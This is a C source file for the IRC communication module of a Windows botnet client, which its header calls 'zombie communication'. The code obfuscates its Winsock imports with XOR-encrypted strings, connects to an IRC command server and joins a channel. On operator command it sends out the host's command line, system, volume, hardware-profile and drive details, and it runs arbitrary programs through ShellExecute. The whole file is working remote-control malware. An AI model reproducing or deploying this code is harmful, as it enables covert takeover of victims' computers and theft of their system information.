/*
 * Module:  irc.c
 * Author:  Toni <matzeton@googlemail.com>
 * Purpose: Basic IRC zombie communication.
 * Origin:  https://bbs.archlinux.org/viewtopic.php?id=64254
 */

#include <winsock2.h>
#include <windows.h>

#include "compat.h"
#include "irc.h"
#include "utils.h"
#include "crypt.h"
#include "crypt_strings.h"
#include "xor_strings_gen.h"


typedef int WSAAPI (*InitFunc)          (WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int WSAAPI (*GetLastErrorFunc) (void);
typedef SOCKET WSAAPI (*socketFunc)    (int af, int type, int proto);
typedef int WSAAPI (*shutdownFunc)     (SOCKET s, int how);
typedef int WSAAPI (*closesocketFunc)  (SOCKET s);
typedef int WSAAPI (*getaddrinfoFunc)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef int WSAAPI (*connectFunc)      (SOCKET s, const struct sockaddr* name, int namelen);
typedef int WSAAPI (*sendFunc)         (SOCKET s, const char* buf, int len, int flags);
typedef int WSAAPI (*recvFunc)         (SOCKET s, char* buf, int len, int flags);
typedef int WSAAPI (*setsockoptFunc)   (SOCKET s, int level, int optname, const char* optval, int optlen);


static ApiCall_t* SocketApi = NULL;
#define FUNC(i)                (SocketApi[XOR_SOCK_FUNCS_END-i-1].func_ptr)
#define RUN_FUNC(i, type, ...) ((type)SocketApi[XOR_SOCK_FUNCS_END-i-1].func_ptr)(__VA_ARGS__)

#define DECRYPT_AND_LIBGETPROC(i, lib, dest) { DBUF(i, tmp); dest = getproc(lib, tmp); }
#define DECRYPT_AND_GETPROC(i, dest)         DECRYPT_AND_LIBGETPROC(i, socklib, dest)
#define DECRYPT_AND_GETPROCF(i)              DECRYPT_AND_LIBGETPROC(i, socklib, FUNC(i))


static WSADATA wsaData = {0};
static struct addrinfo* irc_ip = NULL;
static SOCKET sock = INVALID_SOCKET;

static char* recv_buf = NULL;
static char* send_buf = NULL;
static char* tmp_buf = NULL;


int checkSockStr(const char* chkbuf, enum stridx i)
{
    DBUF(i, needle);
    int ret = COMPAT(strnicmp)(chkbuf, needle, CLEN(i));
    return ret;
}

int initSocket(LoadLibraryFunc loadlib, GetProcAddressFunc getproc)
{
    if (SocketApi == NULL) {
        SocketApi = COMPAT(calloc)(1, sizeof(struct ApiCall)*(XOR_SOCK_FUNCS_END-XOR_SOCK_FUNCS_START-1));
        if (SocketApi == NULL)
            return -1;

        DBUF(SOCKDLL_ENUM, __nameSDLL);
        HMODULE socklib = loadlib(__nameSDLL);
        if (socklib == NULL)
            return -2;

        BOOL ret = TRUE;
        for (unsigned i = XOR_SOCK_FUNCS_START+1; i < XOR_SOCK_FUNCS_END; ++i) {
            if (FUNC(i))
                continue;
            DECRYPT_AND_GETPROCF(i);
            if (!FUNC(i))
                ret = FALSE;
        }
        if (!ret)
            return -3;
    }

    if (!recv_buf) {
        recv_buf = COMPAT(calloc)(S_BUFSIZ, sizeof(char));
        if (!recv_buf)
            return -4;
    }
    if (!send_buf) {
        send_buf = COMPAT(calloc)(S_BUFSIZ+1, sizeof(char));
        if (!send_buf)
            return -4;
    }
    if (!tmp_buf) {
        tmp_buf = COMPAT(calloc)(S_BUFSIZ+1, sizeof(char));
        if (!tmp_buf)
            return -4;
    }

    if (SocketApi) {
        int res = RUN_FUNC(SOCKFUNC_INIT_ENUM, InitFunc, 0x202, &wsaData); /* WSA 2.2 */
        if (res != 0)
            return -5;
    }

    return 0;
}

int shutSocket(void)
{
    if (!SocketApi)
        return -1;
    if (RUN_FUNC(SOCKFUNC_SHUTDOWN_ENUM, shutdownFunc, sock, SD_BOTH) != 0
            || RUN_FUNC(SOCKFUNC_CLOSESOCKET_ENUM, closesocketFunc, sock) == SOCKET_ERROR)
        return RUN_FUNC(SOCKFUNC_ERROR_ENUM, GetLastErrorFunc);
    return 0;
}

int ircRaw(const char* fmt, ...)
{
    if (!SocketApi)
        return -1;

    va_list ap;
    va_start(ap, fmt);
    int ret = COMPAT(vsnprintf)(tmp_buf, S_BUFSIZ+1, fmt, ap);
    va_end(ap);

    if (ret <= 0)
        goto error;
    size_t len = (ret < S_BUFSIZ ? ret : S_BUFSIZ);
#ifdef _PRE_RELEASE
    COMPAT(printf)("irc_raw(%d/%d): %s\n", ret, len, tmp_buf);
#endif
    ret = RUN_FUNC(SOCKFUNC_SEND_ENUM, sendFunc, sock, tmp_buf, len, 0);
    if (ret == SOCKET_ERROR)
        goto error;

error:
    return ret;
}

int ircPrivmsg(const char* target, size_t totalSiz, const char* fmt, ...)
{
    char* buf = COMPAT(calloc)(totalSiz+1, sizeof(char));
    off_t iBuf = 0;

    va_list ap;
    va_start(ap, fmt);
    int ret = COMPAT(vsnprintf)(buf, totalSiz+1, fmt, ap);
    va_end(ap);

    char* msgfmt = "PRIVMSG %s :%s\r\n";
    size_t fmtsiz = COMPAT(strlen)(target) + COMPAT(strlen)(msgfmt) - 4 /* len('%s')*2 */;
    char tmp[S_BUFSIZ - fmtsiz + 1];
    while (ret > 0 && ret != SOCKET_ERROR) {
        size_t bufsiz = ((size_t)ret > S_BUFSIZ-fmtsiz ? S_BUFSIZ-fmtsiz : (size_t)ret);
        COMPAT(memcpy)(&tmp[0], &buf[0]+iBuf, bufsiz);
        tmp[bufsiz] = 0;

        int s = ircRaw(msgfmt, target, &tmp[0]) - fmtsiz;
        ret -= s;
        iBuf += s;

        _WaitForSingleObject(_GetCurrentThread(), 500);
    }
    COMPAT(free)(buf);
    return iBuf;
}

int ircPrivmsgBinary(char* target, const unsigned char* buf, size_t siz)
{
    SIZE_T newsiz = 0;
    char* hexstr = __xbintostr(buf, siz, 1, &newsiz);
    int ret = -1;

    if (hexstr && newsiz) {
        ret = ircPrivmsg(target, newsiz, "%s", hexstr);
        COMPAT(free)(hexstr);
    }
    return ret;
}

int ircLoop(const char* nick, const char* channel, const char* host, const char* port)
{
    if (!SocketApi)
        return -1;

    char *user, *command, *where, *message, *sep, *target;
    int i, j, l, sl, o = -1, start = 0, wordcount;
    struct addrinfo hints = {0};

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (!irc_ip && RUN_FUNC(SOCKFUNC_GETADDRINFO_ENUM, getaddrinfoFunc, host, port, &hints, &irc_ip) != 0) {
        return RUN_FUNC(SOCKFUNC_ERROR_ENUM, GetLastErrorFunc);
    }
    if (irc_ip->ai_addrlen != sizeof(struct sockaddr_in) /* TCP/IP version 4 */)
        return -2;

    sock = RUN_FUNC(SOCKFUNC_SOCKET_ENUM, socketFunc, irc_ip->ai_family, irc_ip->ai_socktype, irc_ip->ai_protocol);
    if (sock == INVALID_SOCKET) {
        return RUN_FUNC(SOCKFUNC_ERROR_ENUM, GetLastErrorFunc);
    } else {
        int sopt = R_BUFSIZ;
        RUN_FUNC(SOCKFUNC_SETSOCKOPT_ENUM, setsockoptFunc, sock, SOL_SOCKET, SO_RCVBUF,   (const char*)&sopt, sizeof(sopt));
        sopt = S_BUFSIZ;
        RUN_FUNC(SOCKFUNC_SETSOCKOPT_ENUM, setsockoptFunc, sock, SOL_SOCKET, SO_SNDBUF,   (const char*)&sopt, sizeof(sopt));
        sopt = S_TIMEOUT;
        /* SO_RECVTIMEO should not less then irc server PING(-command) time */
        //sApi->setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&sopt, sizeof(sopt));
        RUN_FUNC(SOCKFUNC_SETSOCKOPT_ENUM, setsockoptFunc, sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&sopt, sizeof(sopt));
        unsigned char copt = 1;
        RUN_FUNC(SOCKFUNC_SETSOCKOPT_ENUM, setsockoptFunc, sock, SOL_SOCKET, SO_KEEPALIVE,(const char*)&copt, sizeof(copt));
    }

#ifdef _PRE_RELEASE
    struct sockaddr_in* addr = (struct sockaddr_in*)irc_ip->ai_addr;
    COMPAT(printf)("%s to %u.%u.%u.%u:%u\n", "irc: connecting",
        addr->sin_addr.S_un.S_un_b.s_b1, addr->sin_addr.S_un.S_un_b.s_b2,
        addr->sin_addr.S_un.S_un_b.s_b3, addr->sin_addr.S_un.S_un_b.s_b4,
        SWAP_ENDIANESS16(addr->sin_port));
#endif
    if (RUN_FUNC(SOCKFUNC_CONNECT_ENUM, connectFunc, sock, irc_ip->ai_addr, irc_ip->ai_addrlen) != 0)
        return RUN_FUNC(SOCKFUNC_ERROR_ENUM, GetLastErrorFunc);

#ifdef _PRE_RELEASE
    COMPAT(printf)("%s\n", "irc: connected !!");
#endif
    ircRaw("USER %s 0 0 :%s\r\n", nick, nick);
    ircRaw("NICK %s\r\n", nick);

    while ((sl = RUN_FUNC(SOCKFUNC_RECV_ENUM, recvFunc, sock, recv_buf, S_BUFSIZ, 0)) != 0 && sl != SOCKET_ERROR) {
        for (i = 0; i < sl; i++) {
            o++;
            send_buf[o] = recv_buf[i];
            if ((i > 0 && recv_buf[i] == '\n' && recv_buf[i - 1] == '\r') || o == S_BUFSIZ) {
                send_buf[o + 1] = '\0';
                l = o;
                o = -1;
#ifdef _PRE_RELEASE
                COMPAT(printf)("irc: %s", send_buf);
#endif
                if (!checkSockStr(send_buf, SOCKSTR_PING_ENUM)) {
                    send_buf[1] = 'O';
                    ircRaw("%s", send_buf);
                } else if (send_buf[0] == ':') {
                    wordcount = 0;
                    user = command = where = message = NULL;
                    for (j = 1; j < l; j++) {
                        if (send_buf[j] == ' ') {
                            send_buf[j] = '\0';
                            wordcount++;
                            switch(wordcount) {
                                case 1: user = send_buf + 1; break;
                                case 2: command = send_buf + start; break;
                                case 3: where = send_buf + start; break;
                            }
                            if (j == l - 1) continue;
                            start = j + 1;
                        } else if (send_buf[j] == ':' && wordcount == 3) {
                            if (j < l - 1) message = send_buf + j + 1;
                            break;
                        }
                    }

                    if (wordcount < 2) continue;

                    if (!checkSockStr(command, SOCKSTR_MOTD_ENUM) && channel) {
                        ircRaw("JOIN %s\r\n", channel);
                    } else
                    if (!checkSockStr(command, SOCKSTR_PRIVMSG_ENUM) || !checkSockStr(command, SOCKSTR_NOTICE_ENUM)) {
                        if (where == NULL || message == NULL) continue;
                        if ((sep = strchr(user, '!')) != NULL) user[sep - user] = '\0';
                        if (where[0] == '#' || where[0] == '&' || where[0] == '+' || where[0] == '!') target = where; else target = user;
#ifdef _PRE_RELEASE
                        COMPAT(printf)("[from: %s] [reply-with: %s] [where: %s] [reply-to: %s] %s\n", user, command, where, target, message);
                        ircRaw("PRIVMSG %s :%s\r\n", target, message);
#endif
                        /* GetCommandLine(), GetSystemInfo(...), GetVolumeInformation(...), GetCurrentHwProfile(...), ShellExecute(...) */
                        if (!checkSockStr(message, SOCKCMD_GETCMD_ENUM)) {
#ifdef _PRE_RELEASE
                            COMPAT(printf)("irc: COMMAND: GetCommandLine !!\n");
#endif
                            char* cmdline = _GetCommandLine();
                            if (ircPrivmsg(target, COMPAT(strlen)(cmdline), "%s", cmdline) <= 0)
                                break;
                        } else
                        if (!checkSockStr(message, SOCKCMD_GETSYS_ENUM)) {
#ifdef _PRE_RELEASE
                            COMPAT(printf)("irc: COMMAND: GetSystemInfo !!\n");
#endif
                            SYSTEM_INFO si;
                            _GetSystemInfo(&si);
                            if (ircPrivmsgBinary(target, (unsigned char*)&si, sizeof(si)) <= 0)
                                break;
                        } else
                        if (!checkSockStr(message, SOCKCMD_GETVOL_ENUM)) {
#ifdef _PRE_RELEASE
                            COMPAT(printf)("irc: COMMAND: GetVolumeInformation !!\n");
#endif
                            char* root = NULL;
                            if (qtok(message, &message) && *message) {
                                root = qtok(message, &message);
                                if (root) {
                                    size_t len = COMPAT(strlen)(root);
                                    /* 0'ing \r\n */
                                    if (len >= 2) {
                                        root[len-1] = 0; 
                                        root[len-2] = 0;
                                    }
                                }
                            }
                            struct gvi {
                                char volname[128];
                                DWORD volserial;
                                DWORD volflags;
                                char volfs[32];
                            };
                            struct gvi _gvi = {{0}, 0, 0, {0}};
                            if (_GetVolumeInformation(root, _gvi.volname, sizeof(_gvi.volname), &_gvi.volserial, NULL, &_gvi.volflags, _gvi.volfs, sizeof(_gvi.volfs)) == TRUE) {
                                if (ircPrivmsgBinary(target, (unsigned char*)&_gvi, sizeof(_gvi)) <= 0)
                                    break;
                            } else {
                                ircRaw("PRIVMSG %s :ERROR\r\n", target);
                            }
                        } else
                        if (!checkSockStr(message, SOCKCMD_GETHWPROFILE_ENUM)) {
#ifdef _PRE_RELEASE
                            COMPAT(printf)("irc: COMMAND: GetCurrentHwProfile !!\n");
#endif
                            HW_PROFILE_INFO hw;
                            if (_GetCurrentHwProfile(&hw)) {
                                if (ircPrivmsgBinary(target, (unsigned char*)&hw, sizeof(hw)) <= 0)
                                    break;
                            } else {
                                DBUF(SOCKCMD_FMT0_ENUM, __nameFMT0);
                                DBUF(SOCKCMD_MSGERR_ENUM, __nameMSGERR);
                                ircPrivmsg(target, COMPAT(strnlen)(__nameMSGERR, CLEN(SOCKCMD_MSGERR_ENUM)), __nameFMT0, __nameMSGERR);
                            }
                        } else
                        if (!checkSockStr(message, SOCKCMD_SHELLEXEC_ENUM)) {
#ifdef _PRE_RELEASE
                            COMPAT(printf)("irc: COMMAND: ShellExecute !!\n");
#endif
                            char* file    = NULL;
                            char* params  = NULL;
                            char* showCmd = NULL;
                            size_t len    = 0;
                            if (qtok(message, &message) && *message) {
                                file = qtok(message, &message);
                                if (file && *message) {
                                    params = qtok(message, &message);
                                    if (params && *message) {
                                        showCmd = qtok(message, &message);
                                        if (showCmd) {
                                            len = COMPAT(strlen)(showCmd);
                                            /* 0'ing \r\n */
                                            if (len >= 2) {
                                                showCmd[len-1] = 0;
                                                showCmd[len-2] = 0;
                                            }
                                        }
                                    }
                                }
                            }
                            if (len > 0) {
                                long scmd = strtol(showCmd, NULL, 10);
                                DBUF(SOCKCMD_SHELLOP_ENUM, __nameSHOP);
                                DBUF(SOCKCMD_FMT1_ENUM, __nameFMT1);
                                DBUF(SOCKCMD_MSGERR_ENUM, __nameMSGERR);
                                HINSTANCE si = _ShellExecute(NULL, __nameSHOP, file, params, NULL, scmd);
                                if ((int)si <= 32) {
                                    ircPrivmsg(target, COMPAT(strnlen)(__nameMSGERR, CLEN(SOCKCMD_MSGERR_ENUM)) + 12 /* len(int32_max)+ len(': ') */
                                        , __nameFMT1, __nameMSGERR, (int)si);
                                }
                            } else {
                                DBUF(SOCKCMD_FMT0_ENUM, __nameFMT0);
                                DBUF(SOCKCMD_MSGSHELL_ENUM, __nameMSGSH);
                                ircPrivmsg(target, COMPAT(strnlen)(__nameMSGSH, CLEN(SOCKCMD_MSGSHELL_ENUM)), __nameFMT0, __nameMSGSH);
                            }
                        } else
                        if (!checkSockStr(message, SOCKCMD_ENUMDEVICES_ENUM)) {
                            struct LogicalDrives* devs = COMPAT(calloc)(DEFAULT_DEVS, sizeof(struct LogicalDrives));
                            if (devs) {
                                DWORD count = dwEnumDrives(devs, DEFAULT_DEVS);
                                DBUF(SOCKCMD_FMT0_ENUM, __nameFMT0);
                                DBUF(SOCKCMD_MSGERR_ENUM, __nameMSGERR);
                                if (count > 0) {
#ifdef _PRE_RELEASE
                                    COMPAT(printf)("irc: COMMAND: EnumDrives: %d !!\n", (int)count);
#endif
                                    ircPrivmsgBinary(target, (unsigned char*)devs, count*sizeof(struct LogicalDrives));
                                } else ircPrivmsg(target, COMPAT(strnlen)(__nameMSGERR, CLEN(SOCKCMD_MSGERR_ENUM)), __nameFMT0, __nameMSGERR);
                                COMPAT(free)(devs);
                            }
                        }
                    }
                }
            }
        }
    }

    return 0;
}
